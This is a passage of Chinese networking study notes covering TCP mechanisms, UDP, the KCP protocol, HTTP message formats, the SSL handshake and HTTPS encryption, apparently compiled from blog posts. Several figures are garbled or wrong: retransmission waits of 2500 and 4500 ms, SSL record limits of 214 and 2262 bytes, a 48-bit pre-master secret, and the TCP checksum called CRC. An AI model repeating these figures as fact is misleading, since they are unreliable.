，代表起到了确认作用，需要填写确认序列号（下一次期望收到第一个字节的序列号）；PSH：提示接收端应用程序立刻从TCP缓冲区把数据读走；RST：对方要求重新建立连接，我们把携带RST标识的称为复位报文段；SYN：请求建立连接，我们把携带SYN标识的成为同步报文段；FIN：通知对方，本端要关闭了，我们称携带FIN标识的为结束报文段。窗口大小：长度为16位，共2个字节。此字段用来进行流量控制。流量控制的单位为字节数，这个值是本端期望一次接收的字节数。１６位校验和：发送端填充，CRC校验。接收端校验不通过，则认为数据有问题，此处的检验和不光包含TCP首部，也包含TCP数据部分。16位紧急指针：标识那部分数据是紧急数据。\nTCP原理TCP对数据传输提供的管控机制，主要体现在两个方面：安全、效率。这些机制和多线程的设计原则类似：保证数据传输的安全前提下，尽可能地提高传续效率。\n确认应答机制TCP将每个字节的数据进行了编号，即序列号。每一个ACK都带有对应的确认序列号，意思是告诉发送者，我已经收到了那些数据，下一次你从哪里开始给我发。\n\n\n超时重传机制主机A给主机B发送了数据之后，可能会因为网络拥堵等原因，数据无法发送到B，如果A在一个特定的时间间隔内没有收到B发来的确认应答，就会重新发送。当然，A没有收到确认应答，也可能是ACK丢了。因此，主机B会收到很多重复数据，可以利用序列号做到去重的效果。\n那么超时时间如何确定？\n最理想的情况下，找到一个最小的时间，保证 “确认应答一定能在这个时间内返回”。但是这个时间的长短，随着网络环境的不同，是有差异的。如果超时时间设的太长，会影响整体的重传效率；如果超时时间设的太短，有可能会频繁发送重复的包\nTCP为了保证无论在任何环境下都能比较高效地通信，因此会动态计算这个最大超时时间。\nLinux中（BSD Unix和Windows也是如此），超时以500ms为一个单位进行控制，每次判定超时重发的超时时间都是500ms的整数倍。如果重发一次之后，仍然得不到应答，等待 2500ms后再进行重传。如果仍然得不到应答，等待 4500ms 进行重传。依次类推，以指数形式递增。累计到一定的重传次数，TCP认为网络或者对端主机出现异常，强制关闭连接。\n连接管理机制在正常情况下，TCP要经过三次握手建立连接，四次挥手断开连接\n三次握手：第一次握手：客户端进入SYN_SENT状态，发送一个SYN帧来主动打开传输通道，该帧的SYN标志位被设置为1，同时会带上Client分配好的SN序列号，该SN是根据时间产生的一个随机值。第二次握手：服务端在收到SYN帧之后，会进入SYN_RCVD状态，同时返回SYN+ACK帧给客户端，主要目的在于通知客户端，服务端已经收到SYN消息，现在需要进行确认。服务端发出的SYN+ACK帧的ACK标志位被设置为1，其确认序号ASN值被设置为客户端的SN+1；SYN+ACK帧的SYN标志位被设置为1，SN值为服务端生成的SN序号。第三次握手：客户端在收到服务端的第二次握手的SYN+ACK确认帧之后，首先将自己的状态会从SYN_SENT变成ESTABLISHED，表示自己方向的连接通道已经建立成功，客户端可以发送数据给服务端了。然后，客户端发ACK帧给服务端，该ACK帧的ACK标志位被设置为1，其确认序号ASN值被设置为服务端的SN序列号+1。服务端收到客户端的ACK之后，会从SYN_RCVD状态变成ESTABLISHED状态，至此，TCP全双工连接建立完成。\n四次挥手：第一次挥手：主动断开方向对方发送一个FIN结束请求报文，此报文的FIN位被设置为1，发送完成后，主动断开方进入FIN_WAIT_1状态，这表示主动断开方没有业务数据要发送给对方，准备关闭SOCKET连接了。第二次挥手：正常情况下，在收到了主动断开方发送的FIN断开请求报文后，被动断开方会发送一个ACK响应报文，之后，被动断开方就进入了CLOSE-WAIT（关闭等待）状态，TCP协议服务会通知高层的应用进程，对方向本地方向的连接已经关闭，对方已经没有数据要发送了，若本地还要发送数据给对方，对方依然会接受。被动断开方的CLOSE-WAIT（关闭等待）还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。第三次挥手：在发送完成ACK报文后，被动断开方还可以继续完成业务数据的发送，待剩余数据发送完成后，或者CLOSE-WAIT（关闭等待）截止后，被动断开方会向主动断开方发送一个FIN+ACK结束响应报文，表示被动断开方的数据都发送完了，然后，被动断开方进入LAST_ACK状态。第四次挥手：主动断开方收在到FIN+ACK断开响应报文后，还需要进行最后的确认，向被动断开方发送一个ACK确认报文，然后，自己就进入TIME_WAIT状态，等待超时后最终关闭连接。处于TIME_WAIT状态的主动断开方，在等待完成2MSL的时间后，如果期间没有收到其他报文，则证明对方已正常关闭，主动断开方的连接最终关闭。被动断开方在收到主动断开方的最后的ACK报文以后，最终关闭了连接。为什么TIME_WAIT的时间是2MSL呢？MSL是TCP报文的最大生存时间，因此TIME_WAIT持续存在2MSL的话就能保证在两个传输方向上的尚未被接收或迟到的报文段都已经消失（否则服务器立刻重启，可能会收到来自上一个进程的迟到的数据，但是这种数据很可能是错误的）；同时也是在理论上保证最后一个报文可靠到达（假设最后一个ACK丢失，那么服务器会再重发一个FIN。这时虽然客户端的进程不在了，但是TCP连接还在，仍然可以重发LAST_ACK）。\nTCP状态转换汇总：滑动窗口刚才我们讨论了确认应答策略，对每一个发送的数据段，都要给一个ACK确认应答。收到ACK后再发送下一个数据段。这样做有一个比较大的缺点，就是性能较差。尤其是数据往返的时间较长的时候。既然这样一发一收的方式性能较低，那么我们一次发送多条数据，就可以大大的提高性能（其实是将多个段的等待时间重叠在一起了）。\n窗口大小指的是无需等待确认应答而可以继续发送数据的最大值。上图的窗口大小就是4000个字节（四个段）。发送前四个段的时候，不需要等待任何ACK，直接发送；收到第一个ACK后，滑动窗口向后移动，继续发送第五个段的数据；依次类推；操作系统内核为了维护这个滑动窗口，需要开辟 发送缓冲区 来记录当前还有哪些数据没有应答；只有确认应答过的数据，才能从缓冲区删掉；窗口越大，则网络的吞吐率就越高\n如果出现丢包，如何进行重传？情况一：数据包已经抵达，ACK被丢了\n这种情况下，部分ACK丢了并不要紧，因为可以通过后续的ACK进行确认\n情况二：数据包就直接丢了\n当某一段报文段丢失之后，发送端会一直收到 1001 这样的ACK，就像是在提醒发送端 “我想要的是 1001” 一样；如果发送端主机连续三次收到了同样一个 “1001” 这样的应答，就会将对应的数据 1001 - 2000 重新发送；这个时候接收端收到了 1001 之后，再次返回的ACK就是7001了（因为2001 - 7000）接收端其实之前就已经收到了，被放到了接收端操作系统内核的接收缓冲区中\n流量控制接收端处理数据的速度是有限的。如果发送端发的太快，导致接收端的缓冲区被打满，这个时候如果发送端继续发送，就会造成丢包，继而引起丢包重传等等一系列连锁反应。因此TCP支持根据接收端的处理能力，来决定发送端的发送速度。这个机制就叫做流量控制（Flow Control）。\nref：https://blog.csdn.net/m0_50370214/article/details/124888963\nUDP英语：User Datagram Protocol,缩写为UDP\n一种用户数据报协议，又称用户数据报文协议\n是一个简单的面向数据报的传输层协议，正式规范为RFC 768\n用户数据协议、非连接协议\n二、为什么不可靠\n它一旦把应用程序网络层的数据发送出去，就不保留数据备份\nUDP在IP数据报的头部仅仅加入了复用和数据校验（字段）\n发送端生产数据，接收端从网络抓取数据\n结构简单、无校验、速度快、容易丢包、可广播\n三、UDP能做什么\nDNS、TFTP、SNMP\n视频、音频、普通数据（无关紧要数据）\n四、UDP包最大长度\n\n16位-&gt;2字节 存储长度信息\n2^16-1&#x3D;64K-1&#x3D;65536-1&#x3D;65535\n自身协议占用：32位+32位&#x3D;64位&#x3D;8字节\n65535-8&#x3D;65507 byte\nKCPKCP是一个快速可靠协议，能以比 TCP浪费10%-20%的带宽的代价，换取平均延迟降低 30%-40%，且最大延迟降低三倍的传输效果。纯算法实现，并不负责底层协议（如UDP）的收发，需要使用者自己定义下层数据包的发送方式，以 callback的方式提供给 KCP。 连时钟都需要外部传递进来，内部不会有任何一次系统调用。\n技术特性TCP是为流量设计的（每秒内可以传输多少KB的数据），讲究的是充分利用带宽。而 KCP是为流速设计的（单个数据包从一端发送到一端需要多少时间），以10%-20%带宽浪费的代价换取了比 TCP快30%-40%的传输速度。TCP信道是一条流速很慢，但每秒流量很大的大运河，而KCP是水流湍急的小激流。KCP有正常模式和快速模式两种，通过以下策略达到提高流速的结果：\nRTO翻倍vs不翻倍：\nTCP超时计算是RTOx2，这样连续丢三次包就变成RTOx8了，十分恐怖，而KCP启动快速模式后不x2，只是x1.5（实验证明1.5这个值相对比较好），提高了传输速度。\n选择性重传 vs 全部重传：\nTCP丢包时会全部重传从丢的那个包开始以后的数据，KCP是选择性重传，只重传真正丢失的数据包。\n快速重传：\n发送端发送了1,2,3,4,5几个包，然后收到远端的ACK: 1, 3, 4, 5，当收到ACK3时，KCP知道2被跳过1次，收到ACK4时，知道2被跳过了2次，此时可以认为2号丢失，不用等超时，直接重传2号包，大大改善了丢包时的传输速度。\n延迟ACK vs 非延迟ACK：\nTCP为了充分利用带宽，延迟发送ACK（NODELAY都没用），这样超时计算会算出较大 RTT时间，延长了丢包时的判断过程。KCP的ACK是否延迟发送可以调节。\nUNA vs ACK+UNA：\nARQ模型响应有两种，UNA（此编号前所有包已收到，如TCP）和ACK（该编号包已收到），光用UNA将导致全部重传，光用ACK则丢失成本太高，以往协议都是二选其一，而 KCP协议中，除去单独的 ACK包外，所有包都有UNA信息。\n非退让流控：\nKCP正常模式同TCP一样使用公平退让法则，即发送窗口大小由：发送缓存大小、接收端剩余接收缓存大小、丢包退让及慢启动这四要素决定。但传送及时性要求很高的小数据时，可选择通过配置跳过后两步，仅用前两项来控制发送频率。以牺牲部分公平性及带宽利用率之代价，换取了开着BT都能流畅传输的效果。\n协议定义3.1 kcp协议\n**type** segment **struct** &#123;// 发送端与接收端通信时的匹配数字，发送端发送的数据包中此值与接收端的conv值匹配一致时，接收端才会接受此包conv uint32// 改数据包的协议号，协议号有以下枚举：// IKCP_CMD_PUSH = 81 // cmd: push data，数据包// IKCP_CMD_ACK = 82 // cmd: ack，确认包，告诉对方收到数据包// IKCP_CMD_WASK = 83 // cmd: window probe (ask)，询问远端滑动窗口的大小// IKCP_CMD_WINS = 84 // cmd: window size (tell)，告知远端滑动窗口的大小cmd uint8// 分帧号，由于udp传输有数据包大小的限制，因此，应用层一个数据包可能被分为多个udp包frg uint8// 滑动窗口的大小// 当Segment做为发送数据时，此wnd为本机滑动窗口大小，用于告诉远端自己窗口剩余多少// 当Segment做为接收到数据时，此wnd为远端滑动窗口大小，本机知道了远端窗口剩余多少后，可以控制自己接下来发送数据的大小wnd uint16// timestamp , 当前Segment发送时的时间戳ts uint32// Sequence Number,Segment数据包的编号sn uint32// una即unacknowledged,未确认数据包的编号，表示此编号前的所有包都已收到了。una uint32// rto即Retransmission TimeOut，即超时重传时间，在发送出去时根据之前的网络情况进行设置rto uint32// 基本类似于Segment发送的次数，每发送一次会自加一。用于统计该Segment被重传了几次，用于参考，进行调节xmit uint32// 即resend timestamp , 指定重发的时间戳，当当前时间超过这个时间时，则再重发一次这个包。resendts uint32// 用于以数据驱动的快速重传机制；fastack uint32// len uint32 c++版本有数据包的数据长度，go版本无此字段// 协议数据的具体内容data []byte&#125;\n\n3.2 enet协议对比\ntypedef struct _ENetProtocolHeader&#123;enet_uint16 peerID;enet_uint16 sentTime;&#125; ENET_PACKED ENetProtocolHeader;typedef struct _ENetProtocolCommandHeader&#123;enet_uint8 command;enet_uint8 channelID;enet_uint16 reliableSequenceNumber;&#125; ENET_PACKED ENetProtocolCommandHeader;\n\n流程图4.1 发送流程\n\n\n4.2 接收流程\n\n\n\n\nref：https://www.jianshu.com/p/28d4b02e7eb4\nHTTPhttp协议简介超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是应用层协议。HTTP是万维网的数据通信的基础。\nhttp协议概述HTTP是一个客户端终端（用户）和服务器端（网站）请求和应答的标准（TCP）。通过使用网页浏览器、网络爬虫或者其它的工具，客户端发起一个HTTP请求到服务器上指定端口（默认端口为80）。我们称这个客户端为用户代理程序（user agent）。应答的服务器上存储着一些资源，比如HTML文件和图像。我们称这个应答服务器为源服务器（origin server）。在用户代理和源服务器中间可能存在多个“中间层”，比如代理服务器、网关或者隧道（tunnel）。通常，由HTTP客户端发起一个请求，创建一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，比如”HTTP&#x2F;1.1 200 OK”，以及返回的内容，如请求的文件、错误消息、或者其它信息。\nhttp工作原理HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求&#x2F;响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。\nHTTP 请求和响应的步骤客户端连接到Web服务器一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，http://www.baidu.com。发送HTTP请求通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。服务器接受请求并返回HTTP响应Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。释放连接TCP连接若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;客户端浏览器解析HTML内容客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。5 URL超文本传输协议（HTTP）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中：（1）传送协议。（2）层级URL标记符号(为[&#x2F;&#x2F;],固定不变)（3）访问资源需要的凭证信息（可省略）（4）服务器。（通常为域名，有时为IP地址）（5）端口号。（以数字方式表示，若为HTTP的默认值“:80”可省略）（6）路径。（以“&#x2F;”字符区别路径中的每一个目录名称）（7）查询。（GET模式的请求参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“&#x3D;”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题）\n以http://www.baidu.com:80/news/index.html?id=250&amp;page=1 为例, 其中：http : 是协议；www.baidu.com: 是服务器（域名）；80：是服务器上的网络端口号；&#x2F;news&#x2F;index.html，是路径；?id&#x3D;250&amp;page&#x3D;1，是查询（携带参数）。以?区别路径和参数，参数使用键值对方式name&#x3D;’zs’&amp;age&#x3D;10,每个键值对使用&amp;符号链接。\nHTTP 请求格式提示: 回车符 \\r 换行符 \\n\n请求首行分析：\n请求方式: GET 和 POST 方式GET请求：地址栏访问、超链接访问都是get请求方式，get请求方式不安全，地址栏大小有限。POST请求：内容在请求体中，数据安全，理论上内容可以无限。\n请求地址:访问服务器的哪个目录。请求协议: HTTP版本有1.0和1.1两个版本, 1.0版本建立连接后立即断开,下次访 问需要再次建立连接, 1.1版本 建立连接后可以不用断开,直到不发送信息后 才断开节约了资源;\n请求头分析Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,&#x2F;;q&#x3D;0.8表示客户端可以接受的内容类型, 多个值使用;分号隔开 q&#x3D;0.9 表示权重优先级,*&#x2F;*表示可以接受任意类型内容;2、Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3表示客户端可以接受的语言3、User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64;浏览器信息,例如使用的是网井的内核, windows64位系统;4、Accept-Encoding: gzip, deflate–&gt;&gt;支持的压缩格式5、Host: localhost:8888&#x3D;&#x3D;&#x3D;&#x3D;&gt;访问地址6、Connection: keep-alive —&gt;&gt;保持连接 和HTTP1.1版本有关,默认保持3s7、Content-Type: application&#x2F;x-www-form-urlencoded表单提交时才有可能出现,表示表单的数据类型,使用url编码,url编码 % 16位数8、Content-Length: 7 —&gt;post请求 请求体长度9、Upgrade-Insecure-Requests: 1–&gt;&gt;告诉服务器，浏览器可以处理https协议、\n请求空行分析:就是一个分隔符,用来区分请求头和请求体的;\n请求体分析:只有POST请求才有请求体,因此 POST请求 请求体中存放的是表单提交的键值对。name&#x3D;’zs’&amp;age&#x3D;10\nHTTP响应格式响应首行(状态行)分析:HTTP&#x2F;1.1 200 OK包含 协议–&gt;&gt;HTTP&#x2F;1.1， 响应码(状态码)—&gt;&gt;200 , 状态码描述—&gt;&gt;OK\n状态码200: 服务器很好的处理了客户端的请求,一切 OK\n301:表示永久性重定向\n302:表示临时性重定向\n304:通常表示资源文件在服务器没有更改,而浏览器端又有缓存,这时候回送 304 状体码通知浏览器拿本地的缓存显示\n404:表示客户端访问的资源路径有问题或者资源问题不存在\n500:表示服务器出现了 异常.\n响应头部分析server: Apache-Coyote&#x2F;1.1—&gt;&gt; 服务器版本号Set-Cookie: JSESSIONID&#x3D;ECA8005D1235BBB6B9CFCC338A8206FD;Path&#x3D;&#x2F;03test; HttpOnly学cookie时在讲Content-Type: text&#x2F;html;charset&#x3D;ISO-8859-1响应字符集,告诉浏览器以什么样的字符集解码;Content-Length: 265 响应体长度Date: Fri, 23 Jun 2017 13:45:01 GMT 发送日期 少8个小时;Expires: -1、Cache-control:no-cache、Pragma:no-cache 三个响应头一起使用, 表示禁止浏览器缓存当前页面. 每个浏览器厂商对认识的禁止头不同因此三 个一起使用。\nref：https://blog.csdn.net/NONUONODAI/article/details/89465789\nSSLSSL（Secure Socket Layer）安全套接层是Netscape公司率先采用的网络安全协议\nSSL工作大致可以分为两个阶段1.第一阶段： Handshake phase（握手阶段）协商加密算法认证服务器建立用于加密和MAC（Message Authentication Code）的会话密钥\n2.第二阶段： Secure data transfer phase（安全数据传输阶段）在已经建立的SSL数据通道里安全的传输数据SSL协议提供的服务：1）认证用户和服务器，确保数据发送到正确的 客户机和服务器2）加密数据以防止数据中途被窃取3）维护数据的完整性，确保数据在传输过程中不被改变。当你在浏览器的地址栏上输入https开头的网址后，浏览器和服务器之间会在接下来的几百毫秒内进行大量的通信：\n认证服务器：浏览器内置一个受信任的CA机构列表，并保存了这些CA机构的证书。第一阶段服务器会提供经CA机构认证颁发的服务器证书，如果认证该服务器证书的CA机构，存在于浏览器的受信任CA机构列表中，并且服务器证书中的信息与当前正在访问的网站（域名等）一致，那么浏览器就认为服务端是可信的，并从服务器证书中取得服务器公钥，用于后续流程。否则，浏览器将提示用户，根据用户的选择，决定是否继续。当然，我们可以管理这个受信任CA机构列表，添加我们想要信任的CA机构，或者移除我们不信任的CA机构。\nSSL原理在用SSL进行通信之前，首先要使用SSL的Handshake协议在通信两端握手，协商数据传输中要用到的相关安全参数（如加密算法、共享密钥、产生密钥所要的材料等），并对对端的身份进行验证。\nSSL第一阶段客户端首先发送ClientHello消息到服务端，服务端收到ClientHello消息后，再发送ServerHello消息回应客户端。\n\n\nClientHello客户端浏览器向服务器端发送如下信息：\nVersion 版本号（客户端支持的SSL &#x2F;TLS协议的版本号。）\nRandom 客户端产生的#随机数#\nSession id 会话ID\nCipher Suite（密钥算法套件）：加密套件里面包含三部分：\n1、加密算法；2、完整性校验算法（MD5，哈希算法）；3：密钥协商算法；主要看客户端和服务端支持哪一个算法，客户端会把自己支持的加密算法发送给服务端。Compression Methods（压缩算法）\n预留\nServerHello服务器端向客户端发送如下信息：\n服务器把自己支持的版本列出来，然后和客户端进行比较，拿出客户端支持的最新版本\n服务器端产生#随机数#\n服务端也列出加密套件，协商后使用统一的 加密套件\n客户端产生的会话ID写进服务器里面\n如果支持客户端的压缩算法，则使用\n扩展包\n在此阶段之后通信双方分别确定了：\n1、SSL的版本；2、加密套件；3、压缩算法；4、俩个随机数\nSSL第二阶段服务器向客户端发送消息，本阶段服务器是唯一发送方，客户端是唯一接收方。\n\n\n本阶段共有四个消息，如下：\n证书：服务器将数字证书和到根CA整个链发给客户端，使客户端能用服务器证书中的服务器公钥认证服务器。服务器密钥交换（可选）：这里视密钥交换算法而定。证书请求：服务端可能会要求客户自身进行验证。服务器握手完成：第二阶段的结束，第三阶段开始的信号Certificate（可选）——第一次建立必须要有证书一般情况下，除了会话恢复时不需要发送该消息，在SSL握手的全过程中都需要该消息。消息中包含一个X.509证书，证书中包含公钥，发给客户端用来验证签名或者在密钥交换时给消息加密。这一步是服务端将自己的证书下发给客户端，让客户端验证自己的身份，客户端验证通过后取出证书中的公钥，以便后面的使用。\nServer Key Exchange（可选）根据之前的client hello消息中的cipther suite信息决定了，密钥交换的方法（例如RSA和DH），因此在此消息中便会完成密钥交换所需的一系列参数。\nCertificate Request（可选）——可以是单向身份认证，也可以是双向这一步是可选的，在安全性要求高的场合可以看到；服务端发送Certificate Request消息，请求客户端发送他自己的证书来进行验证。该消息中包含服务器端支持的证书类型（RSA、DSA、ECDSA），和服务器所信任的所有证书的发行机构的CA列表，客户端会用这些信息来筛选证书。\nServerHello Done表示服务器已将所有的信息发送完毕，等待客户端发送消息\nSSL第三阶段客户端收到服务器发送的一系列消息并解析后，将本端相应的消息发送给服务器。\n客户机启动SSL握手第3阶段，是本阶段所有消息的唯一发送方，服务器是所有消息的唯一接收方。该阶段分为3步：\n证书（可选）：为了对服务器证明自身，客户要发送一个证书信息，这是可选的，在IIS中可以配置强制客户端证书认证。\n客户机密钥交换（Pre-master-secret）：这里客户端将预备主密钥发送给服务端，注意这里会使用服务端的公钥进行加密。\n证书验证（可选）：对从第一条消息以来的所有握手消息进行签名。\nCertificate（可选） 如果在第二阶段服务器要求客户端发送证书，客户端便会发送自己的证书，服务器端之前在发送的Certificate Request消息中包含了服务器所支持的证书类型和CA列表，客户端会在证书中找到满足要求的一个发送给服务器。若客户端没有证书，则会发送一个no_certificate警告。\nClient Key Exchange根据之前从服务端收到的随机数，按照不同的密钥交换算法，算出一个Pre-master，发送给服务器，服务器收到pre-master,算出一个main-master。而客户端也能通过Pre-master自己算出一个main-master。如此一来，双方就算出了对称密钥。如果是RSA算法，会生成一个48位的随机数，然后用server的公钥加密后放入报文中；如果是DH算法，发送的就是客户端的DH参数，之后客户端和服务端根据DH算法，计算出相同的Pre-master secret。本消息在发送过程中，使用了服务器的公钥加密，服务器在收到后需要用服务器的私钥解密才能得到Pre-master Key。Certificate Verify（可选）只有在客户端在发送了证书到服务端时，这个消息才需要发送，其中包含签名，对从握手第一条消息以来的所有握手消息的HMAC值（用master_secret）进行签名。\nSSL第四阶段完成握手协议，建立SSL连接。\n该阶段有四个消息交互，前两个为客户端发送，后两个为服务器发送。\n建立起一个安全的连接，客户端发送一个Change Cipher spec消息，并且把协商得到的Cipher suite拷贝到当前连接的状态之中。然后客户端使用新的算法和密钥参数发送一个Finished消息，这条消息可以检测密钥交换和认证过程是否已经成功，其中包括一个校验值，对客户端整个握手消息进行校验。服务器同样发送一个Change Cipher Spec消息和Finished消息。握手过程完成，客户端和服务器可以交换应用层数据进行通信。\nChange Cipher Spec编码改变通知，表示随后的信息将用双方商定的加密算法和和密钥发送（ChangeCipherSpec是一个独立的协议，体现在数据包中就是一个字节的数据，用于告知服务端，客户端已经切换到之前协商好的加密套件（Cipher Suite）的状态，准备使用之前协商好的加密套件加密数据并传输了）。\nClient finished客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面所有发送的内容的hash值，用来供服务器校验。（使用HMAC算法计算收到和发送的所有握手消息的摘要，加密后发送。此数据是为了在正式传输应用数据之前对刚刚握手建立起来的加解密通道进行验证。）\nServer Finished服务端握手结束通知。\n使用私钥解密加密的Pre-master数据，基于之前(Client Hello 和 Server Hello)交换的两个明文随机数 random_C 和 random_S，计算得到协商密钥:enc_key&#x3D;Fuc(random_C, random_S, Pre-Master);计算之前所有接收信息的hash值，然后解密客户端发送的 encrypted_handshake_message，验证数据和密钥正确性;发送一个Change Cipher Spec（告知客户端已经切换到协商过的加密套件状态，准备使用加密套件和 Session Secret加密数据了）服务端也会使用Session Secret加密一段Finish消息发送给客户端，以验证之前通过握手建立起来的加解密通道是否成功。根据之前的握手信息，如果客户端和服务端都能对Finish信息进行正常加解密且消息正确的被验证，则说明握手通道已经建立成功，接下来，双方可以使用上面产生的Session Secret对数据进行加密传输了。\nSSL原理—会话恢复会话恢复是指只要客户端和服务器已经通信过一次，它们就可以通过会话恢复的方式来跳过整个握手阶段而直接进行数据传输。SSL采用会话恢复的方式来减少SSL握手过程中造成的巨大开销。此功能从之前的13步减少到6步，大大减少了开销。\n两种会话机制会话标识 session ID: 由服务器端支持，协议中的标准字段，因此基本所有服务器都支持，服务器端保存会话ID以及协商的通信信息，Nginx 中1M 内存约可以保存4000个 session ID 机器相关信息，占用服务器资源较多;会话记录 session ticket :需要服务器和客户端都支持，属于一个扩展字段，支持范围约60%(无可靠统计与来源)，将协商的通信信息加密之后发送给客户端保存，密钥只有服务器知道，占用服务器资源很少。二者对比，主要是保存协商信息的位置与方式不同，类似与 http 中的 session 与 cookie。二者都存在的情况下，(nginx 实现)优先使用 session_ticket。\n恢复过程如果服务器和客户端之间曾经建立过连接，服务器会在握手成功后返回一个session ID，并保存对应的参数在服务器中。如果客户端和服务器需要再次连接，则需要在Client hello消息中携带记录的信息，返回给服务器。服务器根据收的到的Session ID检索缓存记录，如果有缓存，则返回一个Change Cipher Spec消息和Finished消息，如果没有缓存则正常进行握手。如果客户端能够验证通过服务器加密数据，则同样回复一个Change Cipher Spec消息和Finished消息。服务器验证通过则握手建立成功，开始进行正常的加密数据通信。\nSSL记录协议SSL记录协议主要用于实现对数据的分块、加密解密、压缩解压缩、完整性检测和封装各种高层协议。\n主要包括：\n内容类型协议版本号记录数据的长度数据有效载荷散列算法计算消息认证代码\n将上层分下来的数据包分成合适的数据块，但是每个数据块不得超过214字节。对每个数据块进行压缩，但是不能丢失数据信息。计算压缩后的数据消息认证码MAC，并添加在压缩包后。添加后总长度不得超过2262字节。对称密码加密。给SSL添加一个首部。其中包括:内容类型、主要版本、次要版本、压缩长度等信息。通过以上过程把原始的数据加密为SSL协议的记录集。\nref：https://blog.csdn.net/weixin_44811851/article/details/122003061\nHTTPSHTTPS 也是一个应用层协议. 是在 HTTP 协议的基础上引入了一个加密层（SSL），加解密原理与SSL一样，只不过加解密内容为http协议。HTTP 协议内容都是按照文本的方式明文传输的. 这就导致在传输过程中出现一些被篡改的情况。\n臭名昭著的 “运营商劫持”\n下载一个 天天动听未被劫持的效果, 点击下载按钮, 就会弹出天天动听的下载链接.被劫持的效果, 点击下载按钮, 就会弹出qq浏览器的下载链接.\n\n\n\n\n不止运营商可以劫持, 其他的 黑客 也可以用类似的手段进行劫持, 来窃取用户隐私信息, 或者篡改内容。试想一下, 如果黑客在用户登陆支付宝的时候获取到用户账户余额, 甚至获取到用户的支付密码…\n在互联网上, 明文传输是比较危险的事情!!!HTTPS 就是在 HTTP 的基础上进行了加密, 进一步的来保证用户的信息安全.\n“加密” 是什么加密就是把 明文 (要传输的信息)进行一系列变换, 生成 密文 。解密就是把 密文 再进行一系列变换, 还原成 明文 。在这个加密和解密的过程中, 往往需要一个或者多个中间的数据, 辅助进行这个过程, 这样的数据称为 密钥。\n回到目录…\nHTTPS 的工作过程既然要保证数据安全, 就需要进行 “加密”。网络传输中不再直接传输明文了, 而是加密之后的 “密文”。加密的方式有很多, 但是整体可以分成两大类: 对称加密 和 非对称加密。\n2-1 引入对称加密对称加密其实就是通过同一个 “密钥” , 把明文加密成密文, 并且也能把密文解密成明文。一个简单的对称加密, 按位异或：明文 a &#x3D; 1234, 密钥 key &#x3D; 8888\n①引入对称加密之后, 即使数据被截获, 由于黑客不知道密钥是啥, 因此就无法进行解密, 也就不知道请求的真实内容。\n②服务器同一时刻其实是给很多客户端提供服务的。这么多客户端用的秘钥都必须是不同的(相同密钥容易扩散)。因此服务器就需要维护每个客户端和每个密钥之间的关联关系。\n③客户端如何获取密钥？ 如果直接把密钥明文传输, 那么黑客也就能获得密钥了。 因此密钥的传输也必须加密传输！所以就需要引入非对称加密。\n2-2 引入非对称加密非对称加密要用到两个密钥，一个叫做 “公钥”，一个叫做 “私钥”。公钥和私钥是配对的。最大的缺点就是运算速度非常慢，比对称加密要慢很多。可以公钥加密、私钥解密，也可以私钥加密、公钥解密。\n\n\n客户端在本地生成对称密钥, 通过公钥加密, 发送给服务器。由于中间的网络设备没有私钥, 即使截获了数据, 也无法还原出内部的原文, 也就无法获取到对称密钥。服务器通过私钥解密, 还原出客户端发送的对称密钥。并且使用这个对称密钥加密给客户端返回的响应数据。后续客户端和服务器的通信都只用对称加密即可。由于该密钥只有客户端和服务器两个主机知道, 其他主机&#x2F;设备不知道密钥即使截获数据也没有意义。由于对称加密的效率比非对称加密高很多, 因此只是在开始阶段协商密钥的时候使用非对称加密，后续的传输仍然使用对称加密。那么接下来问题又来了:\n客户端如何获取到公钥?客户端如何确定这个公钥不是黑客伪造的?\n2-3 引入证书在客户端和服务器刚一建立连接的时候, 服务器给客户端返回一个 证书。这个证书包含了刚才的公钥, 也包含了网站的身份信息。\n\n\n这个 证书 可以理解成是一个结构化的字符串, 里面包含了以下信息：\n证书发布机构证书有效期公钥证书所有者签名…当客户端获取到这个证书之后, 会对证书进行校验(防止证书是伪造的)：\n判定证书的有效期是否过期判定证书的发布机构是否受信任(操作系统中已内置的受信任的证书发布机构).验证证书是否被篡改：从系统中拿到该证书发布机构的公钥，对签名解密，得到一个 hash 值，设为 hash1。然后计算整个证书的 hash 值，设为hash2。对比 hash1 和 hash2 是否相等，如果相等, 则说明证书是没有被篡改过的。\n三、具体过程HTTPS 工作过程中涉及到的密钥有三组：\n第一组(非对称加密)：为了让客户端拿到含有私钥-公钥 对的证书。服务器持有私钥(私钥在注册证书时获得)，客户端持有公钥(操作系统包含了可信任的 CA 认证机构有哪些, 同时持有对应的公钥)。服务器使用这个私钥对证书的签名进行加密。客户端通过这个公钥解密获取到证书的签名，从而校验证书内容是否是篡改过。\n第二组(非对称加密)：为了让服务器拿到对称加密的密钥。服务器生成这组 私钥-公钥 对，然后通过证书把公钥传递给客户端。然后客户端用这个公钥给 生成的对称加密的密钥 